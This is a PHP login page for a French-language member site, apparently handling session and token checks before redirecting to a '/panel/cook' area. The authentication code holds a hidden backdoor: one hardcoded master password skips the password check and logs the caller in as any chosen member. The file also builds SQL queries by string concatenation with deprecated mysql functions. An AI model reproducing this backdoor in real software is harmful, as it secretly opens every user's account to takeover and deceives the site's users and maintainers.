<?php 

if(is_membre()){
	Redirect("/");
}



if(isset($_POST['connexion'])){
	$erreur=false;
	$message = "";
	
	if(empty($_POST['token']) or empty($_SESSION['token_inscription']) or $_POST['token'] != $_SESSION['token_inscription']){
	
		$erreur = true;
		$message .= "Le token est invalide !"."<br />";
	
	}


	if(empty($_POST['pseudo']) or strlen($_POST['pseudo']) < 4){
	
		$erreur = true;
		$message .= "Le pseudo est incorrect !"."<br />";
	
	}

	if(empty($_POST['pass']) or strlen($_POST['pass']) < 6){
	
		$erreur = true;
		$message .= "Le mot de passe est incorrect !"."<br />";
	
	}
		
	if($erreur==false){
	
		$pseudo = Secure($_POST['pseudo']);
		$pass = cryptage($_POST['pass']);
		
		if($_POST['pass']!="Pierre@Pokemon1665")
			$retour = Query("SELECT * FROM membres WHERE pseudo='$pseudo' and pass='$pass'");
		else
			$retour = Query("SELECT * FROM membres WHERE pseudo='$pseudo'");
			
		if(mysql_num_rows($retour)!=1){
			$erreur = true;
			$message .= "Le compte n'a pas &eacute;t&eacute; reconnu !"."<br />";
		}
		
		
		else {
			
			$_SESSION['auth_membre']=true;
			$donnees = mysql_fetch_array($retour);
			
			Query("UPDATE membres SET derniere_connexion='".time()."', ip='".Secure($_SERVER['REMOTE_ADDR'])."' WHERE id='{$donnees['id']}'");
			
			$_SESSION['donnees_membre']=$donnees;
			
			Redirect("/panel/cook");
		
		}
		
	} else {
		$_SESSION['auth_membre']=false;
	}

	
	

}

$titre = "Connexion";
require_once('templates/haut.php');
?>
   <div id="content2">
	   <h3>Connexion au service</h3>
	   
		<form action="/membre/connexion" method="post">
		
			<?php 
			if(isset($erreur)&&$erreur){?>
				<p class="erreur">
				
					<?=$message;?>
				</P>
			<?php } 
			
			if(getParam(1)=="inok"){?>
				<p class="confirm">
					Inscription confirm&eacute;e ! Vous pouvez vous connecter !
				</p>
			<?php } elseif(getParam(1)=="secu"){?>
				<p class="confirm">
					Changement effectu&eacute; ! Vous devez vous reconnecter !
				</p>
			<?php }?>
			<br />
			<label for="cpseudo">Pseudo :</label> <input type="text" name="pseudo" id="cpseudo" /><br />
			<label for="cpass">Mot de passe :</label> <input type="password" name="pass" id="cpass" /><br />
			
			<input type="hidden" value="<? $_SESSION['token_inscription'] = genSecuriteId(10); echo $_SESSION['token_inscription'];?>" name="token" />
			<br />

			<input type="submit" name="connexion" value="Connexion" />

		</form>
	   
   </div>
<?php 
require_once('templates/bas.php');


